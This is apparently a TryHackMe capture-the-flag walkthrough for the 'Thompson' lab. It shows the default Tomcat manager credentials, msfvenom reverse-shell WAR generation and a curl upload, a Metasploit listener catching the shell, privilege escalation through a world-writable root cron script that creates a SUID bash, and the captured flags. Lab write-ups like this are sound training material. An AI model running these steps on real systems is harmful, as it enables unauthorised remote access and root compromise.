| Category          | Details                                                 |
|-------------------|---------------------------------------------------------|
| 📝 **Name**       | [Thompson](https://tryhackme.com/room/bsidesgtthompson) |  
| 🏷 **Type**       | THM Challenge                                           |
| 🖥 **OS**         | Linux                                                   |
| 🎯 **Difficulty** | Easy                                                    |
| 📁 **Tags**       | Tomcat, Default credentials, Crontab                    |

## Task 1: Thompson

### user.txt

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Thompson]
└─$ nmap -sS -sC -sV $TARGET    
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 19:17 +0100
Nmap scan report for 10.81.150.185
Host is up (0.050s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
```

#### Check if Tomcat Web Application Manager is running
```
┌──(magicrc㉿perun)-[~/attack/THM Thompson]
└─$ curl -s -D - -o /dev/null http://$TARGET:8080/manager/html                 
HTTP/1.1 401 
Cache-Control: private
Expires: Wed, 31 Dec 1969 16:00:00 PST
WWW-Authenticate: Basic realm="Tomcat Manager Application"
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 2473
Date: Thu, 01 Jan 2026 13:18:25 GMT
```

#### Try default credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Thompson]
└─$ curl -s -D - -o /dev/null -u tomcat:s3cret http://$TARGET:8080/manager/html 
HTTP/1.1 200 
Cache-Control: private
Expires: Wed, 31 Dec 1969 16:00:00 PST
Set-Cookie: JSESSIONID=CA195F44B8762816BC9B0396E522B4E0;path=/manager;HttpOnly
Content-Type: text/html;charset=utf-8
Transfer-Encoding: chunked
Date: Thu, 01 Jan 2026 13:19:05 GMT
```

#### Generate `java/shell_reverse_tcp` in form of `.war` file
```
┌──(magicrc㉿perun)-[~/attack/THM Thompson]
└─$ msfvenom -p java/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war
Payload size: 13035 bytes
Final size of war file: 13035 bytes
Saved as: shell.war
```

#### Deploy `shell.war` reverse shell using `/manager/html`
```
┌──(magicrc㉿perun)-[~/attack/THM Thompson]
└─$ CSRF_NONCE=$(curl -s -c cookies.txt -u tomcat:s3cret "http://$TARGET:8080/manager/html" | grep -oP "CSRF_NONCE=\K[^\"]+" -m 1) && \
curl -s -b cookies.txt -u tomcat:s3cret "http://$TARGET:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF_NONCE" -F "deployWar=@shell.war" -o /dev/null
```

#### Start `msfconsole` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Thompson]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload java/shell_reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => java/shell_reverse_tcp
[*] Started reverse TCP handler on 192.168.132.170:4444
```

#### Access `/shell` Java application to spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Thompson]
└─$ curl http://$TARGET:8080/shell
```

#### Confirm foothold gained
```
[*] Command shell session 1 opened (192.168.132.170:4444 -> 10.81.150.76:57526) at 2026-01-01 14:23:55 +0100

id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
python -c 'import pty; pty.spawn("/bin/bash")'
tomcat@ubuntu:/$ 
```

#### Captrue user flag
```
tomcat@ubuntu:/$ cat /home/jack/user.txt
cat /home/jack/user.txt
39400c90bc683a41a8935e4719f181bf
```

### root.txt

#### Discover `/home/jack/id.sh` in `/etc/crontab`
```
tomcat@ubuntu:$ cat /etc/crontab
<SNIP>
*  *    * * *   root    cd /home/jack && bash id.sh
```

#### Check `/home/jack/id.sh` permissions
```
tomcat@ubuntu:/$ cat /home/jack/id.sh && ls -l /home/jack/id.sh && lsattr /home/jack/id.sh             
#!/bin/bash
id > test.txt
-rwxrwxrwx 1 jack jack 26 Aug 14  2019 /home/jack/id.sh
-------------e-- /home/jack/id.sh
```
With write permissions we could easily spawn a root shell.

#### Overwrite `/home/jack/id.sh` with 'root shell spawner' and wait for `/tmp/root_shell` to be created
```
tomcat@ubuntu:/$ echo '/bin/cp /bin/bash /tmp/root_shell && /bin/chmod +s /tmp/root_shell' > /home/jack/id.sh
```

#### Run `/tmp/root_shell` to escalate privileges
```
tomcat@ubuntu:/$ /tmp/root_shell -p
/tmp/root_shell -p
root_shell-4.3# id
id
uid=1001(tomcat) gid=1001(tomcat) euid=0(root) egid=0(root) groups=0(root),1001(tomcat)
```

#### Capture root flag
```
root_shell-4.3# cat /root/root.txt
d89d5391984c0450a95497153ae7ca3a
```
